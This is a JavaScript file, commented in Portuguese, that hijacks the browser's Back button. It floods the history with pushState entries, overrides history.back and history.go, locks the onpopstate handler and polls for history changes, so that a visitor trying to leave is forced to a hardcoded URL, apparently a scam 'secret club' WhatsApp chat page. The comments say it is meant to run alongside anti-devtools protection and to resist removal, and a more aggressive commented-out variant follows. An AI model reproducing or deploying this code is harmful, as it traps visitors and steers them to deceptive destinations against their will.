// Back Redirect Compatível com Anti-Devtools
// Funciona mesmo com scripts de proteção ativos

(function() {
    'use strict';
    
    // ========== CONFIGURAÇÃO ==========
    const CONFIG = {
        redirectUrl: 'https://chat-whatsapp.clubesecreto.club/clubesecreto?id=19.70&redirect=https://chat.secretoclube.com/chamada', // ALTERE PARA SUA URL
        delay: 1000, // Aguarda 1 segundo antes de ativar (para carregar após o anti-devtools)
        attempts: 3, // Número de tentativas de hijack do histórico
        debug: false // Ative para ver logs no console
    };
    // =================================
    
    // Função de log condicional
    const log = (...args) => {
        if (CONFIG.debug) console.log('[BackRedirect]', ...args);
    };
    
    // Armazena o estado original
    let isRedirecting = false;
    let historyLength = window.history.length;
    
    // Método 1: Hijack agressivo do histórico
    function hijackHistory() {
        // Limpa qualquer manipulação anterior
        try {
            // Adiciona múltiplas entradas no histórico
            for (let i = 0; i < CONFIG.attempts; i++) {
                const state = { page: i, url: window.location.href };
                history.pushState(state, '', window.location.href);
            }
            
            log('Histórico preparado com', CONFIG.attempts, 'entradas');
        } catch (e) {
            log('Erro ao manipular histórico:', e);
        }
    }
    
    // Método 2: Override do history.back()
    function overrideHistoryBack() {
        // Salva a função original
        const originalBack = history.back;
        const originalGo = history.go;
        
        // Override history.back
        history.back = function() {
            log('history.back() interceptado');
            if (!isRedirecting) {
                isRedirecting = true;
                window.location.replace(CONFIG.redirectUrl);
            }
        };
        
        // Override history.go
        history.go = function(delta) {
            log('history.go() interceptado com delta:', delta);
            if (delta < 0 && !isRedirecting) {
                isRedirecting = true;
                window.location.replace(CONFIG.redirectUrl);
            } else {
                originalGo.call(this, delta);
            }
        };
    }
    
    // Método 3: Monitoramento contínuo do histórico
    function monitorHistory() {
        let lastLength = history.length;
        
        setInterval(() => {
            if (history.length < lastLength && !isRedirecting) {
                log('Mudança no histórico detectada');
                isRedirecting = true;
                window.location.replace(CONFIG.redirectUrl);
            }
            lastLength = history.length;
        }, 50);
    }
    
    // Método 4: Event Listener com alta prioridade
    function setupPopstateListener() {
        // Remove listeners existentes se possível
        const oldListeners = window.onpopstate;
        window.onpopstate = null;
        
        // Adiciona com captura para executar primeiro
        window.addEventListener('popstate', function(e) {
            log('Popstate capturado');
            
            if (!isRedirecting) {
                isRedirecting = true;
                
                // Previne propagação
                e.stopImmediatePropagation();
                e.preventDefault();
                
                // Força redirecionamento
                setTimeout(() => {
                    window.location.replace(CONFIG.redirectUrl);
                }, 0);
            }
        }, true); // true = fase de captura, executa antes
        
        // Método alternativo usando defineProperty
        try {
            Object.defineProperty(window, 'onpopstate', {
                set: function(fn) {
                    log('Tentativa de sobrescrever onpopstate bloqueada');
                    return function(e) {
                        if (!isRedirecting) {
                            isRedirecting = true;
                            window.location.replace(CONFIG.redirectUrl);
                        }
                    };
                },
                get: function() {
                    return function(e) {
                        if (!isRedirecting) {
                            isRedirecting = true;
                            window.location.replace(CONFIG.redirectUrl);
                        }
                    };
                }
            });
        } catch (e) {
            log('Não foi possível proteger onpopstate:', e);
        }
    }
    
    // Método 5: Interceptar beforeunload como fallback
    function setupBeforeUnload() {
        let isLeaving = false;
        
        window.addEventListener('beforeunload', function(e) {
            if (!isLeaving && !isRedirecting) {
                isLeaving = true;
                
                // Tenta detectar se é navegação para trás
                setTimeout(() => {
                    if (document.visibilityState === 'visible' && !isRedirecting) {
                        isRedirecting = true;
                        window.location.replace(CONFIG.redirectUrl);
                    }
                    isLeaving = false;
                }, 100);
            }
        });
    }
    
    // Método 6: Proteção contra remoção
    function protectScript() {
        // Impede que o script seja removido ou modificado
        try {
            Object.freeze(CONFIG);
            Object.freeze(window.BackRedirect);
        } catch (e) {
            log('Não foi possível congelar objetos:', e);
        }
    }
    
    // Função de inicialização principal
    function initialize() {
        log('Iniciando Back Redirect...');
        
        // Aplica todos os métodos
        hijackHistory();
        overrideHistoryBack();
        monitorHistory();
        setupPopstateListener();
        setupBeforeUnload();
        protectScript();
        
        log('Back Redirect ativo!');
        
        // Re-aplica hijack periodicamente
        setInterval(hijackHistory, 2000);
    }
    
    // API Pública
    window.BackRedirect = {
        setUrl: function(url) {
            CONFIG.redirectUrl = url;
            log('URL atualizada para:', url);
        },
        getConfig: function() {
            return {...CONFIG};
        },
        forceRedirect: function() {
            window.location.replace(CONFIG.redirectUrl);
        }
    };
    
    // Aguarda o anti-devtools carregar primeiro
    setTimeout(initialize, CONFIG.delay);
    
    // Garante execução mesmo se o DOM já carregou
    if (document.readyState === 'complete') {
        setTimeout(initialize, CONFIG.delay + 100);
    } else {
        window.addEventListener('load', () => {
            setTimeout(initialize, CONFIG.delay + 100);
        });
    }
    
})();

// ============================================
// IMPLEMENTAÇÃO ALTERNATIVA SUPER AGRESSIVA
// Use esta se a versão acima não funcionar
// ============================================
/*
(function() {
    const url = 'https://google.com'; // MUDE AQUI
    let triggered = false;
    
    // Cria buffer no histórico
    for(let i = 0; i < 5; i++) {
        history.pushState(null, '', '#');
    }
    
    // Monitora todas as mudanças possíveis
    const checkBack = () => {
        if ((history.length < 5 || location.hash === '') && !triggered) {
            triggered = true;
            location.replace(url);
        }
    };
    
    // Múltiplos métodos de detecção
    setInterval(checkBack, 10);
    window.addEventListener('popstate', () => setTimeout(checkBack, 0));
    window.addEventListener('hashchange', () => setTimeout(checkBack, 0));
    
    // Override agressivo
    const block = () => { checkBack(); return false; };
    history.back = block;
    history.go = block;
    
})();
*/
